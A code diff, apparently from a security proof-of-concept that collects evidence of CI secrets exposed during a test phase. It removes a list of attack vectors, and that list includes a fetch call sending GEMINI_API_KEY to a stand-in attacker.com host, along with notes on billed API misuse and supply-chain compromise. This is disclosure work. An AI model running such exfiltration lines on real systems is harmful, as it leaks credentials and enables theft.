@@ -46,12 +46,7 @@ export function pocTestPhaseEvidence() {
       GITHUB_TOKEN_present: 'GITHUB_TOKEN' in process.env,
       GITHUB_TOKEN_length: process.env.GITHUB_TOKEN?.length || 0,
     },
-    // What an attacker would do at this point:
-    attack_vectors: [
-      'Exfiltrate GEMINI_API_KEY: fetch("https://attacker.com/?key=" + process.env.GEMINI_API_KEY)',
-      'Make Gemini API calls charged to Google: new GoogleGenerativeAI(key).getGenerativeModel(...)',
-      'Combined with preinstall GITHUB_TOKEN: full supply chain compromise',
-    ],
+    // Attack vectors documented in POC-WRITEUP.md, not in evidence JSON.
   };
 
   // Also read preinstall evidence if it exists
